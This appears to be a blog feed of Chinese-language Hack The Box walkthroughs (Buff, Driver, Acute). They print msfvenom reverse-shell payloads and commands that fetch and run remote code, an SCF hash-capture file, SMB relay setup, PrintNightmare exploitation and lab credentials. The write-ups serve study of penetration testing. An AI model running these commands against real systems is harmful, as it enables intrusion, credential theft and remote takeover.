src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816155821.png"></p><blockquote><p>确实是，docker@tcuser<br>本来是让正常用户的windows主机去使用管理toolbox的，但是这里能被我们的docker机访问到</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816160007.png"></p><blockquote><p>至此移动到了toolbox宿主机，还需要进一步移动到真正的windows宿主机，到了docker逃逸环节，上cdk：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./cdk eva --full<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816165418.png"></p><blockquote><p>看到了挂载了的<code>c:\users\administrator</code>下面有ssh的公私钥，验证后下载下来直接连接</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -y -e -f id_rsa<br>ssh-keygen -y -e -f id_rsa.pub<br></code></pre></td></tr></table></figure><blockquote><p><code>ssh-keygen -y -e -f &lt;file&gt;</code> 将返回密钥的公钥，因此可以使用它来检查私钥是否与公钥匹配</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816172743.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240816170034.png"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Buff</title>
    <link href="/blog/HTB/HTB%20Buff/"/>
    <url>/blog/HTB/HTB%20Buff/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818134222.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818134721.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818134804.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818134911.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818135404.png"></p><h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818135044.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818135329.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818135456.png"></p><blockquote><p>优先尝试命令执行</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818135651.png"></p><blockquote><p>看起来是一个文件上传的getshell，用id参数访问触发</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818135832.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -c <span class="hljs-string">&quot;gci -r -file c:\users&quot;</span><br>powershell -c <span class="hljs-string">&quot;gc C:\users\shaun\Desktop\user.txt&quot;</span><br></code></pre></td></tr></table></figure><h2 id="0x03-加固"><a href="#0x03-加固" class="headerlink" title="0x03 加固"></a>0x03 加固</h2><blockquote><p>开smb拿nc把shell反弹出来</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818143452.png"></p><blockquote><p>上线stowaway</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">start</span> <span class="hljs-string">&quot;&quot;</span> stow-agent-x64.exe -c <span class="hljs-number">10.10.16.8:5566</span> -s <span class="hljs-number">123456</span> --cs gbk --reconnect <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818152156.png"></p><blockquote><p>至此站稳了脚步</p></blockquote><h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><p>查询.net版本：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\<span class="hljs-built_in">NET</span> Framework Setup\NDP\v4\Full&quot; /v Release<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818152454.png"></p><blockquote><p>版本为4.8，放心用winpeas</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">start</span> &quot;&quot; <span class="hljs-built_in">cmd</span> /C &quot;winpeas-x64.exe log&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818161022.png"></p><blockquote><p>发现了denfender</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818162757.png"></p><blockquote><p>奇怪的开在本地的进程，刚刚gci扫目录好像也看到了它的执行文件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818162913.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818171538.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240818171915.png"></p><blockquote><p>原poc执行的是calc.exe，用msfvenom生成反弹shell的shellcode替换</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.8 LPORT=4444 -b <span class="hljs-string">&#x27;\x00\x0A\x0D&#x27;</span> -f python -v payload<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819105831.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240819105838.png"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Driver</title>
    <link href="/blog/HTB/HTB%20Driver/"/>
    <url>/blog/HTB/HTB%20Driver/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812122200.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812122213.png"></p><blockquote><p>80web、135rpc、445smb、5985winrm(远程管理)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812122013.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812122112.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812121605.png"></p><h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p>弱密码admin&#x2F;admin登进后台，打印机固件更新中心</p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812130420.png"></p><blockquote><p>泄露了域信息：driver.htb，尝试host碰撞</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812130747.png"></p><blockquote><p>暂时来看没什么收获</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812131756.png"></p><p>对唯一的功能点update测试：</p><blockquote><p>“选择打印机型号并上传相应的固件更新到我们的文件共享。我们的测试团队将手动审查上传并很快启动测试”</p></blockquote><h2 id="0x03-smb"><a href="#0x03-smb" class="headerlink" title="0x03 smb"></a>0x03 smb</h2><p>猜测和开放的445有关，用crackmapexec的ng版nxc(netexec)工具尝试枚举共享：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nxc smb driver.htb --shares -u FYHypo -p <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#凭据任意，列出共享</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812132338.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812132538.png"></p><blockquote><p>加上smbclient连接的结果判断无权连接</p></blockquote><p>可以再加一次enum4linux-ng枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enum4linux-ng driver.htb<br></code></pre></td></tr></table></figure><blockquote><p>返回测试文件上传，但因目录爆破没有结果，暂时放弃</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://driver.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php -H <span class="hljs-string">&quot;Authorization: Basic YWRtaW46YWRtaW4=&quot;</span><br></code></pre></td></tr></table></figure><h2 id="0x04-scf攻击"><a href="#0x04-scf攻击" class="headerlink" title="0x04 scf攻击"></a>0x04 scf攻击</h2><p>回到页面的提示：</p><blockquote><p>“选择打印机型号并上传相应的固件更新到我们的文件共享。我们的测试团队将手动审查上传并很快启动测试”</p></blockquote><p>可以给smb在Web页面传文件，且管理者会检查，很容易想到scf攻击去钓鱼管理者</p><p><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/?source=post_page-----1a850f23487b--------------------------------">SMB 共享 – SCF 文件攻击 – 渗透测试实验室 — SMB Share – SCF File Attacks – Penetration Testing Lab (pentestlab.blog)</a></p><h3 id="提取凭据"><a href="#提取凭据" class="headerlink" title="提取凭据"></a>提取凭据</h3><p>SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，这并不新鲜。但是，SCF 文件可用于访问特定的 UNC (网络共享)路径，该文件将在用户打开该文件夹时自动执行。示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scf">[Shell]<br>Command=2<br>IconFile=\\10.10.16.6\FYHypo<br>[Taskbar]<br>Command=Explorer<br></code></pre></td></tr></table></figure><p>当用户浏览共享时，将自动从他的系统建立连接到 SCF 文件中包含的 UNC 路径。Windows 将尝试使用用户的用户名和密码对该共享进行身份验证。在该身份验证过程中，服务器会向客户端发送一个随机的 8 字节质询密钥，并且使用此质询密钥再次加密经过哈希处理的 NTLM&#x2F;LANMAN 密码。响应程序将捕获 NTLMv2 哈希。</p><blockquote><p>此时为了成为中间人我们需要responder起监听</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">responder -I tun0 -v<br></code></pre></td></tr></table></figure><p>上传scf文件后，拦截到NTLMv2 hash：</p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812170049.png"></p><blockquote><p>由于该hash和时间戳有关，同一个用户的hash也是在变化的，随便拉一个出来破解即可：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812170433.png"></p><blockquote><p>拿到用户凭据tony@liltony，之后可以即可winrm登录</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i 10.129.95.238 -u tony -p liltony<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812173103.png"></p><blockquote><p>gci递归找users中的flag:</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> <span class="hljs-literal">-r</span> <span class="hljs-operator">-file</span> c:\users<br><span class="hljs-built_in">gc</span> c:\users\tony\desktop\user.txt<br></code></pre></td></tr></table></figure><h3 id="附加命令执行"><a href="#附加命令执行" class="headerlink" title="附加命令执行"></a>附加命令执行</h3><blockquote><p>文章中还提到了利用msf进行中继攻击getshell的方式，尝试一下：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f exe &gt; fyhypo.exe<br></code></pre></td></tr></table></figure><p>利用smbrelayx.py设置中继时执行的命令(触发反弹shell)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbrelayx.py -h 10.129.95.238 -e ./fyhypo.exe<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs msf">use multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 10.10.16.6<br>set lport 4444<br></code></pre></td></tr></table></figure><p>当用户浏览共享时，SMB 服务器将接收连接，并使用用户名和密码哈希来验证其系统，并将有效负载执行到可写共享。</p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812171858.png"></p><blockquote><p>很奇怪为什么会是认证失败？凭证难道不是它提供的吗？</p></blockquote><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><p>优先检索web目录：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ index.php <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812174155.png"></p><blockquote><p>看过内容后没有发现，进入自动枚举阶段</p></blockquote><p>传winpeas执行，保存到log，下载到本地用less查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs winrm">cd :\programdata\app<br>upload winpeas-x64.exe<br>.\winpeas-x64.exe log<br>download out.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> out.txt | less -R --mouse<br><span class="hljs-comment">#按q退出</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812205429.png"></p><p>补充：winpeas可以在内存中用反射实现不落地运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#先调整执行策略</span><br><span class="hljs-built_in">set-executionpolicy</span> unrestricted <span class="hljs-literal">-scope</span> currentuser<br><span class="hljs-comment">#反射加载</span><br><span class="hljs-variable">$wp</span>=[<span class="hljs-type">System.Reflection.Assembly</span>]::Load([<span class="hljs-built_in">byte</span>[]](<span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-string">&quot;http://10.10.16.2:8000/winpeas-x64.exe&quot;</span> <span class="hljs-literal">-UseBasicParsing</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> Content)); [<span class="hljs-type">winPEAS.Program</span>]::Main(<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812190316.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812192041.png"></p><blockquote><p>虽然本题可能由于winpeas太大无法直接加载进内存导致无法运行，但这种隐藏自己的思维要有</p></blockquote><p>不过这个问题可以通过在cmd中强制使用64位powershell解决：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#先nc反弹个<span class="hljs-built_in">cmd</span>的shell出来<br><span class="hljs-function">C:\<span class="hljs-title">Windows</span>\<span class="hljs-title">SysNative</span>\<span class="hljs-title">WindowsPowerShell</span>\<span class="hljs-title">v1</span>.0\<span class="hljs-title">powershell.exe</span> -<span class="hljs-title">Command</span> &quot;<span class="hljs-title">Invoke</span>-<span class="hljs-title">WebRequest</span> &#x27;<span class="hljs-title">http</span>://10.10.16.2:8000/<span class="hljs-title">winpeas</span>-<span class="hljs-title">x64.exe</span>&#x27; -<span class="hljs-title">OutFile</span> &#x27;<span class="hljs-title">winpeas</span>-<span class="hljs-title">x64.exe</span>&#x27;; ./<span class="hljs-title">winpeas</span>-<span class="hljs-title">x64.exe</span> --<span class="hljs-title">help</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812214253.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812222053.png"></p><blockquote><p>优先关注到spoolsv服务，结合靶机名称很容易想到打spoolsv的打印机漏洞，如Spooler、PetitPotam、PrintNightmare，优先关注到最常见的PrintNightmare</p></blockquote><p>使用nxc的printnightmare模块检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nxc smb driver.htb -u tony -p liltony -printnightmare<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812223800.png"></p><p><a href="https://github.com/calebstewart/CVE-2021-1675?source=post_page-----1a850f23487b--------------------------------">calebstewart&#x2F;CVE-2021-1675: Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare) (github.com)</a></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812224047.png"></p><blockquote><p>两种利用模式，添加管理员用户或执行恶意dll(可以为msf反弹shell的payload)</p></blockquote><p>1、添加管理员用户</p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812225338.png"></p><blockquote><p>得到的是administrator的shell</p></blockquote><p>2、反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -a x64 -p windows/x64/shell_reverse_tcp lport=9999 lhost=10.10.16.6 -f dll -o fyhypo.dll<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812230744.png"></p><blockquote><p>得到的是system的shell</p></blockquote><p>补充：也可以用github下载的本地python脚本进行攻击</p><p>另外，该过程也可由msf完成：</p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240812235342.png"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p><strong>导入ps1模块受阻</strong></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240813000105.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240813000115.png"></p><blockquote><p>如果在尝试导入模块时，被执行策略阻止，如上图，则可以尝试使用curl+管道符解决：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.6</span>/CVE<span class="hljs-literal">-2021-1675</span>.ps1 <span class="hljs-literal">-UseBasicParsing</span> | <span class="hljs-built_in">iex</span><br><span class="hljs-comment">#-UseBasicParsing将允许文件返回，即使 IE 引擎不可用</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Acute</title>
    <link href="/blog/HTB/HTB%20Acute/"/>
    <url>/blog/HTB/HTB%20Acute/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-Acute"><a href="#HTB-Acute" class="headerlink" title="[HTB] Acute"></a>[HTB] Acute</h1><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240821165729.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820105606.png"></p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820105915.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820110027.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.136.40 atsserver.acute.local acute.local&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure><h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820110532.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster vhost -u https://10.129.136.40 --domain acute.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820112235.png"></p><blockquote><p>vhost爆破太慢，暂时放下</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820112647.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, <span class="hljs-keyword">Joshua </span>Morgan, Lois Hopkins<br></code></pre></td></tr></table></figure><blockquote><p>还可以下到一个新员工检查表</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820112932.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820113059.png"></p><blockquote><p>两个页面全是404：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820113503.png"></p><blockquote><p>网站管理员是Lois：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820113617.png"></p><blockquote><p>默认密码： Password1!</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820113734.png"></p><blockquote><p>PSWA上有一个dc_manage会话：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820114009.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820114100.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820114259.png"></p><blockquote><p>remote超链接<code>https://atsserver.acute.local/Acute_Staff_Access</code>是PSWA的地址：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820115431.png"></p><blockquote><p>到这里一条路径就显现出来了，因为我们现在有员工清单和默认密码，完全可以尝试登录PSWA</p></blockquote><blockquote><p>除此之外还应先用exiftool检查该文档</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820114928.png"></p><blockquote><p>创建者是FCastle，修改者是Daniel，然而他们都不在之前的名单中<br>主机名是Acute-PC01</p></blockquote><h2 id="0x03-PSWA"><a href="#0x03-PSWA" class="headerlink" title="0x03 PSWA"></a>0x03 PSWA</h2><h3 id="edavies-Acute-PC01"><a href="#edavies-Acute-PC01" class="headerlink" title="edavies@Acute-PC01"></a>edavies@Acute-PC01</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820115535.png"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, <span class="hljs-keyword">Joshua </span>Morgan, Lois Hopkins<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820120146.png"></p><blockquote><p>接着我尝试了上述清单中的名字，无一例外的全部不正确<br>考虑到外国人可能会有一些奇怪的约定俗成的命名方式，我让gpt生成一个简单的用户名字典</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820120502.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820120941.png"></p><blockquote><p>edavies成功了！</p></blockquote><blockquote><p>这也让我们知道了开发者的命名习惯，名字的前半部分取第一个字母+后半部分（Evan Davies&#x3D;edavies），这样看其实在前面发现的FCastle时就已有预兆</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820121232.png"></p><blockquote><p>拿到了初始立足点</p></blockquote><h2 id="0x04-稳固立足点"><a href="#0x04-稳固立足点" class="headerlink" title="0x04 稳固立足点"></a>0x04 稳固立足点</h2><blockquote><p>在我多次尝试建立smb连接时全都被中断，严重怀疑存在AV</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820160720.png"></p><blockquote><p>查看是否开启defender（0x0为开启）：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240820161815.png"></p><blockquote><p>查看是否开启defender防火墙（0x1为开启）：</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span 